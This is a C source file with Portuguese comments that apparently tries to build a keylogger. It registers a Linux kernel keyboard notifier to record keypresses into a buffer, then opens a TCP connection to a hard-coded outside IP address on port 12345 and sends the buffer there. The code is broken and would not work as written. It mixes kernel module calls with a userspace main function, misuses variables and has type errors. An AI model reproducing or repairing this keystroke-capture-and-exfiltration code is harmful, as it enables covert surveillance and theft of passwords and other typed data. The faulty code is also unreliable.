#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>

char message[100];

static struct notifier_block keyboard_notifier = {
    .notifier_call = keyboard_notifier,
};

static int __init keyboard_driver_init(void)
{
    printk(KERN_INFO "Keyboard driver initialized\n");

    // Registre o manipulador de eventos do teclado
    if (register_keyboard_notifier(&keyboard_notifier))
    {
        printk(KERN_ERR "Failed to register keyboard notifier\n");
        return -ENOMEM;
    }

    return 0;
}

static void __exit keyboard_driver_exit(void)
{
    printk(KERN_INFO "Keyboard driver exiting\n");

    // Desregistre o manipulador de eventos do teclado
    unregister_keyboard_notifier(&keyboard_notifier);
}

int keyboard_notifier(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;
    int i = 0;

    // Verifique se é um evento de tecla pressionada ou liberada
    if (code == KBD_KEYCODE)
    {
        // Verifique o estado da tecla pressionada
        if (param->value == 1)
        {
            printk(KERN_INFO "Key pressed: %d\n", param->value);
            if(i < 100){
        		message[i] = param->value;
        		i++;
        	} else {
	        	return;
    		}
        }
        else if (param->value == 0)
        {
            printk(KERN_INFO "Key released: %d\n", param->value);
            // Faça alguma ação em resposta à tecla liberada
        }
    }

    // Permita que outros manipuladores de eventos processem o evento
    return NOTIFY_OK;
}



#define PORT 12345

int main() {

    keyboard_driver_init();
    
    int sockfd;
    struct sockaddr_in server_addr;
    
    char ip_servidor[] = "192.158.1.38";

    // Criação do socket
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("Erro ao criar o socket");
        exit(1);
    }

    // Configuração do endereço do servidor
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = inet_addr(ip_servidor);

    // Conexão ao servidor
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("Erro ao conectar ao servidor");
        exit(1);
    }

    printf("Digite a mensagem a ser enviada: ");
    fgets(message, 100, stdin);

    // Envio da mensagem para o servidor
    if (send(sockfd, message, strlen(message), 0) == -1) {
        perror("Erro ao enviar a mensagem");
        exit(1);
    }

    printf("Mensagem enviada com sucesso.\n");
    
    keyboard_driver_exit();

    close(sockfd);

    return 0;
}
